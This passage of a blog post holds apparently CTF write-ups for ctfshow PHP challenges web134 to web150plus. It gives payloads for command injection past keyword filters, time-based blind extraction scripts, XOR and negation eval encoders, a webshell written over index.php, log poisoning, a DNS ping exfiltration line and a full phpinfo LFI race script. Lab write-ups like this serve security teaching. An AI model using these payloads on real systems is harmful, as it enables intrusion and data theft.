9 10*/ 11 12highlight_file(__FILE__); 13$key1 = 0; 14$key2 = 0; 15if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) { 16 die(\"nonononono\"); 17} 18@parse_str($_SERVER['QUERY_STRING']); 19extract($_POST); 20if($key1 == '36d' \u0026\u0026 $key2 == '36d') { 21 die(file_get_contents('flag.php')); 22} 看到extract想起变量覆盖\nextract($_POST);\r//提取$_POST数组 payload:\n?_POST[key1]=36d\u0026_POST[key2]=36d web135 \u003c?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: Firebasky\r# @Date: 2020-10-13 11:25:09\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-10-16 18:48:03\r*/\rerror_reporting(0);\rhighlight_file(__FILE__);\r//flag.php\rif($F = @$_GET['F']){\rif(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\reval(substr($F,0,6));\r}else{\rdie(\"师傅们居然破解了前面的，那就来一个加强版吧\");\r}\r} 133plus\n这题ban了很多命令\n但是没ban nl,mv，可以用nl和cp把flag写到其他文件中\npayload:\n`$F `;nl f*\u003e1.txt\r`$F `;mv f*\u003e1.txt 这题也可以用ping进行外带\n`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn\r#通过ping命令去带出数据，然后awk NR一排一排的获得数据 web136 1\u003c?php 2error_reporting(0); 3function check($x){ 4 if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026|\\*|\\?|\\{|\\}|\\\u003e|\\\u003c|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){ 5 die('too young too simple sometimes naive!'); 6 } 7} 8if(isset($_GET['c'])){ 9 $c=$_GET['c']; 10 check($c); 11 exec($c); 12} 13else{ 14 highlight_file(__FILE__); 15} 16?\u003e 这题要用到一个linux的命令tee\nLinux tee命令介绍 tee命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。tee命令通常与其他命令一起通过管道使用。\n如\n1ls /|tee 1.txt 就可以将ls /的结果写入到1.txt文件中\nls /|tee 1 这题ban掉了.\n访问url/1，下载文件1\n看到flag的位置\n?c=cat /f149_15_h3r3|tee 2 web137 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:27:49 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\"private class\"); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\"flag.php\"); 21 } 22} 23 24 25 26call_user_func($_POST['ctfshow']); 我们需要通过post传入一个数组，数组中包含类名和方法名\npayload\nctfshow[]=ctfshow\u0026ctfshow[]=getFlag 又或者\nctfshow=ctfshow::getFlag web138 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:52:13 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\"private class\"); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\"flag.php\"); 21 } 22} 23 24if(strripos($_POST['ctfshow'], \":\")\u003e-1){ 25 die(\"private function\"); 26} 27 28call_user_func($_POST['ctfshow']); 这道题限制了上一题的第二种解法\n第一种还能继续使用\npayload:\nctfshow[]=ctfshow\u0026ctfshow[]=getFlag\rctfshow[0]=ctfshow\u0026ctfshow[1]=getFlag web139 \u003c?php\rerror_reporting(0);\rfunction check($x){\rif(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026|\\*|\\?|\\{|\\}|\\\u003e|\\\u003c|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\rdie('too young too simple sometimes naive!');\r}\r}\rif(isset($_GET['c'])){\r$c=$_GET['c'];\rcheck($c);\rexec($c);\r}\relse{\rhighlight_file(__FILE__);\r}\r?\u003e 这题看着和前面那题是一样的\n但实际上没有写文件的权限\n这题可以通过时间盲注攻击获取文件名已经文件中的字符等\n时间盲注脚本：\n1import requests 2import time 3import string 4 5str = string.ascii_letters + string.digits + \"-\" + \"{\" + \"}\" + \"_\" + \"~\" # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加 6result = \"\" # 初始化一个空字符串，用于保存结果 7 8#获取多少行 9for i in range(1, 99): 10 key = 0 #用于控制内层循环(j)的结束 11 12 #不break的情况下，一行最多几个字符 13 for j in range(1, 99): 14 if key == 1: 15 break 16 for n in str: #n就是一个一个的返回值 17 payload = \"if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi\".format(i, j, n) #{n}是占位符 18 #print(payload) 19 url = \"http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=\" + payload 20 try: 21 requests.get(url, timeout=(2.5, 2.5)) #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。 22 23 # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环 24 except: 25 result = result + n 26 print(result) 27 break 28 if n == '~': #str的最后一位，“~”不常出现，用作结尾 29 key = 1 30 31 # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置 32 result += \" \" 这个脚本的原理其实就是，通过shell编程中的if语句判断\nls /|awk 'NR=={0}'|cut -c {1} 中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s\n而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取\n读到flag的位置，接下来就是读文件了，原理一样\n1import requests 2import time 3import string 4 5str = string.digits+string.ascii_lowercase+\"-\"+\"{\"+\"}\" 6result = \"\" 7 8for i in range(1, 99): 9 key = 0 10 for j in range(1, 99): 11 if key == 1: 12 break 13 for n in str: 14 payload = \"if [ `cat /f149_15_h3r3|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi\".format(i, j, n) 15 #print(payload) 16 url = \"http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=\" + payload 17 try: 18 requests.get(url, timeout=(2.5, 2.5)) 19 20\texcept: 21 result = result + n 22 print(result) 23 break 24 25 result += \" \" web140 函数的利用\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 12:39:25 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_POST['f1']) \u0026\u0026 isset($_POST['f2'])){ 15 $f1 = (String)$_POST['f1']; 16 $f2 = (String)$_POST['f2']; 17 if(preg_match('/^[a-z0-9]+$/', $f1)){ 18 if(preg_match('/^[a-z0-9]+$/', $f2)){ 19 $code = eval(\"return $f1($f2());\"); 20 if(intval($code) == 'ctfshow'){ 21 echo file_get_contents(\"flag.php\"); 22 } 23 } 24 } 25} 原文\n需要$f1($f2());的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。\npayload1： system(system())—\u003e f1=system\u0026f2=system\nstring system( string $command[, int \u0026$return_var] )：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。\npayload2： usleep(usleep())—\u003e f1=usleep\u0026f2=usleep usleep没有返回值。 所以intval参数为空，失败返回0\npayload3： getdate(getdate())—\u003e f1=getdate\u0026f2=getdate\narray getdate([ int $timestamp = time()] )：返回结果是array，参数必须是int型。所以getdate(getdate())—-\u003egetdate(array型)—\u003e失败返回flase，intval为0。\nweb141 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:28:09 9 10*/ 11 12#error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ 15 $v1 = (String)$_GET['v1']; 16 $v2 = (String)$_GET['v2']; 17 $v3 = (String)$_GET['v3']; 18 19 if(is_numeric($v1) \u0026\u0026 is_numeric($v2)){ 20 if(preg_match('/^\\W+$/', $v3)){ 21 $code = eval(\"return $v1$v3$v2;\"); 22 echo \"$v1$v3$v2 = \".$code; 23 } 24 } 25} preg_match('/^\\W+$/', $v3) 此正则表达式用于检查字符串 $v3 是否完全由非单词字符组成，且不能为空。（单词字符：字母、数字和下划线）\n根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行\nphp中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1\u0026v2=1\u0026v3=-phpinfo()-\n羽师傅有个取反脚本\n1\u003c?php 2//在命令行中运行 3 4/*author yu22x*/ 5 6fwrite(STDOUT,'[+]your function: '); 7 8$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); 9 10fwrite(STDOUT,'[+]your command: '); 11 12$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); 13 14echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; 直接用就行\npayload:\n?v1=1\u0026v2=1\u0026v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)- web142 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:36:02 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET['v1'])){ 15 $v1 = (String)$_GET['v1']; 16 if(is_numeric($v1)){ 17 $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); 18 sleep($d); 19 echo file_get_contents(\"flag.php\"); 20 } 21} 这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag\npayload:\n?v1=0 web143 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 12:48:14 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ 14 $v1 = (String)$_GET['v1']; 15 $v2 = (String)$_GET['v2']; 16 $v3 = (String)$_GET['v3']; 17 if(is_numeric($v1) \u0026\u0026 is_numeric($v2)){ 18 if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026|\\;/i', $v3)){ 19 die('get out hacker!'); 20 } 21 else{ 22 $code = eval(\"return $v1$v3$v2;\"); 23 echo \"$v1$v3$v2 = \".$code; 24 } 25 } 26} 这题ban掉了取反，只能用其他位运算符构造payload\n羽师傅的异或脚本\n1\u003c?php 2 3/*author yu22x*/ 4 5$myfile = fopen(\"xor_rce.txt\", \"w\"); 6$contents=\"\"; 7for ($i=0; $i \u003c 256; $i++) { 8\tfor ($j=0; $j \u003c256 ; $j++) { 9 10\tif($i\u003c16){ 11\t$hex_i='0'.dechex($i); 12\t} 13\telse{ 14\t$hex_i=dechex($i); 15\t} 16\tif($j\u003c16){ 17\t$hex_j='0'.dechex($j); 18\t} 19\telse{ 20\t$hex_j=dechex($j); 21\t} 22\t$preg = '/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026|\\;/i'; //根据题目给的正则表达式修改即可 23\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 24\techo \"\"; 25 } 26 27\telse{ 28\t$a='%'.$hex_i; 29\t$b='%'.$hex_j; 30\t$c=(urldecode($a)^urldecode($b)); 31\tif (ord($c)\u003e=32\u0026ord($c)\u003c=126) { 32\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; 33\t} 34\t} 35 36} 37} 38fwrite($myfile,$contents); 39fclose($myfile); 1# -*- coding: utf-8 -*- 2 3# author yu22x 4 5import requests 6import urllib 7from sys import * 8import os 9def action(arg): 10 s1=\"\" 11 s2=\"\" 12 for i in arg: 13 f=open(\"xor_rce.txt\",\"r\") 14 while True: 15 t=f.readline() 16 if t==\"\": 17 break 18 if t[0]==i: 19 #print(i) 20 s1+=t[2:5] 21 s2+=t[6:9] 22 break 23 f.close() 24 output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\" 25 return(output) 26 27while True: 28 param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\" 29 print(param) web144 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 16:21:15 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ 14 $v1 = (String)$_GET['v1']; 15 $v2 = (String)$_GET['v2']; 16 $v3 = (String)$_GET['v3']; 17 18 if(is_numeric($v1) \u0026\u0026 check($v3)){ 19 if(preg_match('/^\\W+$/', $v2)){ 20 $code = eval(\"return $v1$v3$v2;\"); 21 echo \"$v1$v3$v2 = \".$code; 22 } 23 } 24} 25 26function check($str){ 27 return strlen($str)===1?true:false; 28} 这题跟143差不多，只是参数交换了一下位置\n直接异或出了\n?v1=1\u0026v2=-(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%03%01%0b%00%06%00\"^\"%60%60%7f%20%60%2a\")\u0026v3=1 web145 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ 15 $v1 = (String)$_GET['v1']; 16 $v2 = (String)$_GET['v2']; 17 $v3 = (String)$_GET['v3']; 18 if(is_numeric($v1) \u0026\u0026 is_numeric($v2)){ 19 if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026|\\;|\\\u003c|\\\u003e|\\*|\\/|\\^|\\#|\\\"/i', $v3)){ 20 die('get out hacker!'); 21 } 22 else{ 23 $code = eval(\"return $v1$v3$v2;\"); 24 echo \"$v1$v3$v2 = \".$code; 25 } 26 } 27} 这题ban掉了异或运算符^,同时也ban掉了加减乘除\n但是我们还可以考虑构造三目运算符配合取反\npayload:\n/?v1=1\u0026v2=1\u0026v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ 15 $v1 = (String)$_GET['v1']; 16 $v2 = (String)$_GET['v2']; 17 $v3 = (String)$_GET['v3']; 18 if(is_numeric($v1) \u0026\u0026 is_numeric($v2)){ 19 if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026|\\;|\\\u003c|\\\u003e|\\*|\\/|\\^|\\#|\\\"/i', $v3)){ 20 die('get out hacker!'); 21 } 22 else{ 23 $code = eval(\"return $v1$v3$v2;\"); 24 echo \"$v1$v3$v2 = \".$code; 25 } 26 } 27} 这题把三目运算符也ban了\n可以考虑使用位运算符|\npayload:\n?v1=1\u0026v2=1\u0026v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)| web147 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 02:04:38 9 10*/ 11 12 13 14highlight_file(__FILE__); 15 16if(isset($_POST['ctf'])){ 17 $ctfshow = $_POST['ctf']; 18 if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) { 19 $ctfshow('',$_GET['show']); 20 } 21 22} create_function()代码注入\n如果我们第二个参数传入 echo 1;}phpinfo();// 就等价于\nfunction f($a) {\recho 1;}phpinfo();//\r}\r从而执行phpinfo()命令 那要怎么绕过正则表达式呢\n/^[a-z0-9_]*$/isD 这个正则表达式匹配所有的字母数字和下划线\n而且由于\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法\n所以我们可以通过\\create_function()来绕过这个正则表达式\npayload:\nGET show=;};system('cat f*');/*\rPOST ctf=\\create_function web148 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 03:52:11 9 10*/ 11 12 13 14include 'flag.php'; 15if(isset($_GET['code'])){ 16 $code=$_GET['code']; 17 if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\\u0026\\*\\+\\- ]+/\",$code)){ 18 die(\"error\"); 19 } 20 @eval($code); 21} 22else{ 23 highlight_file(__FILE__); 24} 25 26function get_ctfshow_fl0g(){ 27 echo file_get_contents(\"flag.php\"); 28} 没ban异或运算符\npayload:\n(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%03%01%09%01%06%02\"^\"%60%60%7d%21%60%28\");\r//system(\"cat f*\"); web149 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 04:34:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15 16$files = scandir('./'); 17foreach($files as $file) { 18 if(is_file($file)){ 19 if ($file !== \"index.php\") { 20 unlink($file); 21 } 22 } 23} 24 25file_put_contents($_GET['ctf'], $_POST['show']); 26 27$files = scandir('./'); 28foreach($files as $file) { 29 if(is_file($file)){ 30 if ($file !== \"index.php\") { 31 unlink($file); 32 } 33 } 34} 直接用一句话木马覆写掉index.php\nGET ?ctf=index.php\rPOST show=\u003c?php @eval($_POST['1']);?\u003e 写入后\nPOST 1=system('cat /ctfshow_fl0g_here.txt'); web150 非预期 日志注入\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\"flag.php\"); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u003evip = 0; 23 $this-\u003esecret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u003esecret; 28 } 29 30 public function isVIP(){ 31 return $this-\u003evip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER['QUERY_STRING']; 43if(preg_match('/\\_| |\\[|\\]|\\?/', $key)){ 44 die(\"error\"); 45} 46$ctf = $_POST['ctf']; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \"class is exists!\"; 50} 51 52if($isVIP \u0026\u0026 strrpos($ctf, \":\")===FALSE){ 53 include($ctf); 54} 这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入\n或者\n把马写到日志里\npayload:\nGET ?isVIP=true\u00261=system('cat f*');\rPOST ctf=/var/log/nginx/access.log web150plus 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\"flag.php\"); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u003evip = 0; 23 $this-\u003esecret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u003esecret; 28 } 29 30 public function isVIP(){ 31 return $this-\u003evip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER['QUERY_STRING']; 43if(preg_match('/\\_| |\\[|\\]|\\?/', $key)){ 44 die(\"error\"); 45} 46$ctf = $_POST['ctf']; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \"class is exists!\"; 50} 51 52if($isVIP \u0026\u0026 strrpos($ctf, \":\")===FALSE \u0026\u0026 strrpos($ctf,\"log\")===FALSE){ 53 include($ctf); 54} 这题ban掉了非预期解 日志注入的方法\n首先我们需要知道__autoload方法的作用\n__autoload()：自动加载函数，当使用未定义的类时会自动调用该函数。如果$class变量已设置，则将其作为函数调用。 而且这题的__autoload并不在类CTFSHOW中（障眼法）\n这个类在isVIP后面已经结束了\n所以我们可以通过\nif(class_exists($__CTFSHOW__)){\recho \"class is exists!\";\r} 调用任意的类\n我们可以根据php会将.解析成_的特性绕过正则\nGET ?..CTFSHOW..=phpinfo 由于原题需要竞争所以后面就直接把flag放环境变量了\n这里我们直接在phpinfo里面找就行\n原题解法 拿到phpinfo我们就可以getshell了\nPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n过程 1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据\n2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大\n3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接\n4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包\n5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除\n6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell\n处理 PHP 对 enctype=“multipart/form-data\"请求的处理过程如下： 1、请求到达； 2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容； 3、调用相应 PHP 脚本进行处理，如校验名称、大小等； 4、删除临时文件。 总结 php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n大佬的脚本，但是是python2的\n1#!/usr/bin/python 2import sys 3import threading 4import socket 5 6def setup(host, port): 7 TAG=\"Security Test\" 8 PAYLOAD=\"\"\"%s\\r 9\u003c?php file_put_contents('/tmp/g', '\u003c?=eval($_REQUEST[1])?\u003e')?\u003e\\r\"\"\" % TAG 10 REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r 11Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r 12Content-Type: text/plain\\r 13\\r 14%s 15-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD 16 padding=\"A\" * 5000 17 REQ1=\"\"\"POST /06/phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r 18Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r 19HTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r 20HTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r 21HTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r 22HTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r 23Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r 24Content-Length: %s\\r 25Host: %s\\r 26\\r 27%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) 28 #modify this to suit the LFI script 29 LFIREQ=\"\"\"GET /06/lfi.php?file=%s HTTP/1.1\\r 30User-Agent: Mozilla/4.0\\r 31Proxy-Connection: Keep-Alive\\r 32Host: %s\\r 33\\r 34\\r 35\"\"\" 36 return (REQ1, TAG, LFIREQ) 37 38def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): 39 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 40 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 41 42 s.connect((host, port)) 43 s2.connect((host, port)) 44 45 s.send(phpinforeq) 46 d = \"\" 47 while len(d) \u003c offset: 48 d += s.recv(offset) 49 try: 50 i = d.index(\"[tmp_name] =\u0026gt; \") 51 fn = d[i+17:i+31] 52 except ValueError: 53 return None 54 55 s2.send(lfireq % (fn, host)) 56 d = s2.recv(4096) 57 s.close() 58 s2.close() 59 60 if d.find(tag) != -1: 61 return fn 62 63counter=0 64class ThreadWorker(threading.Thread): 65 def __init__(self, e, l, m, *args): 66 threading.Thread.__init__(self) 67 self.event = e 68 self.lock = l 69 self.maxattempts = m 70 self.args = args 71 72 def run(self): 73 global counter 74 while not self.event.is_set(): 75 with self.lock: 76 if counter \u003e= self.maxattempts: 77 return 78 counter+=1 79 80 try: 81 x = phpInfoLFI(*self.args) 82 if self.event.is_set(): 83 break 84 if x: 85 print \"\\nGot it! Shell created in /tmp/g\" 86 self.event.set() 87 88 except socket.error: 89 return 90 91 92def getOffset(host, port, phpinforeq): 93 \"\"\"Gets offset of tmp_name in the php output\"\"\" 94 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 95 s.connect((host,port)) 96 s.send(phpinforeq) 97 98 d = \"\" 99 while True: 100 i = s.recv(4096) 101 d+=i 102 if i == \"\": 103 break 104 # detect the final chunk 105 if i.endswith(\"0\\r\\n\\r\\n\"): 106 break 107 s.close() 108 i = d.find(\"[tmp_name] =\u0026gt; \") 109 if i == -1: 110 raise ValueError(\"No php tmp_name in phpinfo output\") 111 112 print \"found %s at %i\" % (d[i:i+10],i) 113 # padded up a bit 114 return i+256 115 116def main(): 117 118 print \"LFI With PHPInfo()\" 119 print \"-=\" * 30 120 121 if len(sys.argv) \u003c 2: 122 print \"Usage: %s host [port] [threads]\" % sys.argv[0] 123 sys.exit(1) 124 125 try: 126 host = socket.gethostbyname(sys.argv[1]) 127 except socket.error, e: 128 print \"Error with hostname %s: %s\" % (sys.argv[1], e) 129 sys.exit(1) 130 131 port=80 132 try: 133 port = int(sys.argv[2]) 134 except IndexError: 135 pass 136 except ValueError, e: 137 print \"Error with port %d: %s\" % (sys.argv[2], e) 138 sys.exit(1) 139 140 poolsz=10 141 try: 142 poolsz = int(sys.argv[3]) 143 except IndexError: 144 pass 145 except ValueError, e: 146 print \"Error with poolsz %d: %s\" % (sys.argv[3], e) 147 sys.exit(1) 148 149 print \"Getting initial offset...\", 150 reqphp, tag, reqlfi = setup(host, port) 151 offset = getOffset(host, port, reqphp) 152 sys.stdout.flush() 153 154 maxattempts = 1000 155 e = threading.Event() 156 l = threading.Lock() 157 158 print \"Spawning worker pool (%d)...\" % poolsz 159 sys.stdout.flush() 160 161 tp = [] 162 for i in range(0,poolsz): 163 tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) 164 165 for t in tp: 166 t.start() 167 try: 168 while not e.wait(1): 169 if e.is_set(): 170 break 171 with l: 172 sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) 173 sys.stdout.flush() 174 if counter \u003e= maxattempts: 175 break 176 print 177 if e.is_set(): 178 print \"Woot! \\m/\" 179 else: 180 print \":(\" 181 except KeyboardInterrupt: 182 print \"\\nTelling threads to shutdown...\" 183 e.set() 184 185 print \"Shuttin' down...\" 186 for t in tp: 187 t.join() 188 189if __name__==\"__main__\": 190 main() ",
  "wordCount" : "18208",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-22T00:27:55+08:00",
  "dateModified": "2024-12-22T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

